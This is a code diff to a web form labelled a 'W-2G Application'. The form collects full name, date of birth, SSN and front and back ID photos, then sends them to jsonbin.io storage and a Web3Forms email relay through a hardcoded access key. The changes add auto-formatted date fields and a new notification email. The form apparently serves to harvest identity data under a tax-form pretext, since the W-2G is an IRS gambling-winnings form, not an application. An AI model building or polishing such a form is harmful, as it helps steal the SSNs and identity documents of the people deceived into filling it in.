@@ -249,11 +249,36 @@
     <input type="text" name="full_name" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
   </div>
 
-  <!-- Date of Birth -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Date of Birth <span class="text-red-500">*</span></label>
-    <input type="date" name="dob" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
+<div class="flex flex-col">
+  <label class="font-semibold mb-1">
+    Date of Birth <span class="text-red-500">*</span>
+  </label>
+  <input
+    type="text"
+    name="dob"
+    placeholder="DD/MM/YYYY"
+    maxlength="10"
+    pattern="^(0[1-9]|[12][0-9]|3[01])/(0[1-9]|1[0-2])/\d{4}$"
+    class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500"
+    required
+  >
+</div>
+
+<script>
+const dobInput = document.querySelector('input[name="dob"]');
+
+dobInput.addEventListener('input', (e) => {
+  let value = e.target.value.replace(/\D/g, ''); // remove non-digits
+  if (value.length > 2 && value.length <= 4) {
+    value = value.slice(0,2) + '/' + value.slice(2);
+  } else if (value.length > 4) {
+    value = value.slice(0,2) + '/' + value.slice(2,4) + '/' + value.slice(4,8);
+  }
+  e.target.value = value;
+});
+</script>
+
+
 
   <!-- SSN -->
   <div class="flex flex-col">
@@ -403,12 +428,35 @@
     <input type="text" name="initials" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
   </div>
 
-  <!-- Submission Date -->
-  <div class="flex flex-col">
-    <label class="font-semibold mb-1">Date of Submission <span class="text-red-500">*</span></label>
-    <input type="date" name="submission_date" class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500" required>
-  </div>
+<div class="flex flex-col">
+  <label class="font-semibold mb-1">
+    Date of Submission <span class="text-red-500">*</span>
+  </label>
+  <input
+    type="text"
+    name="submission_date"
+    placeholder="DD/MM/YYYY"
+    maxlength="10"
+    pattern="^(0[1-9]|[12][0-9]|3[01])/(0[1-9]|1[0-2])/\d{4}$"
+    class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500"
+    required
+  >
+</div>
 
+
+<script>
+const submissionInput = document.querySelector('input[name="submission_date"]');
+
+submissionInput.addEventListener('input', (e) => {
+  let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+  if (value.length > 2 && value.length <= 4) {
+    value = value.slice(0,2) + '/' + value.slice(2);
+  } else if (value.length > 4) {
+    value = value.slice(0,2) + '/' + value.slice(2,4) + '/' + value.slice(4,8);
+  }
+  e.target.value = value;
+});
+</script>
   <!-- Note -->
   <div class="lg:col-span-2">
     <p class="text-gray-600 text-sm">
@@ -497,7 +545,7 @@ form.addEventListener("submit", async function (e) {
       return json.secure_url;
     };
 
-    /* Upload ID images */
+    /* ---------------- Upload Images ---------------- */
     let idFrontUrl = "";
     let idBackUrl = "";
 
@@ -530,7 +578,6 @@ form.addEventListener("submit", async function (e) {
 
     const existingJson = await existingRes.json();
     const submissions = existingJson.record?.submissions || [];
-
     submissions.push(submission);
 
     await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
@@ -542,20 +589,27 @@ form.addEventListener("submit", async function (e) {
       body: JSON.stringify({ submissions }),
     });
 
-    /* ---------------- Web3Forms ---------------- */
+    /* ---------------- Web3Forms (SAFE VERSION) ---------------- */
     const web3FormData = new FormData();
-    formData.forEach((value, key) => web3FormData.append(key, value));
-
     web3FormData.append("access_key", "69459698-1206-46d8-ba1c-d0d5dbc970a7");
-    web3FormData.append(
-      "from_name",
-      formData.get("full_name") || "New Applicant"
-    );
-    web3FormData.append(
-      "from_email",
-      formData.get("email") || "no-reply@example.com"
-    );
+    web3FormData.append("name", formData.get("full_name"));
+    web3FormData.append("email", formData.get("email"));
     web3FormData.append("subject", "New W-2G Application Submission");
+
+    web3FormData.append(
+      "message",
+      `
+New W-2G Application Received
+
+Name: ${formData.get("full_name")}
+Email: ${formData.get("email")}
+
+ID Front: ${idFrontUrl || "Not provided"}
+ID Back: ${idBackUrl || "Not provided"}
+
+Submitted at: ${new Date().toLocaleString()}
+      `
+    );
 
     const web3Res = await fetch("https://api.web3forms.com/submit", {
       method: "POST",
@@ -563,6 +617,8 @@ form.addEventListener("submit", async function (e) {
     });
 
     const web3Result = await web3Res.json();
+    console.log("Web3Forms response:", web3Result);
+
     if (!web3Result.success) {
       throw new Error(web3Result.message || "Web3Forms failed");
     }
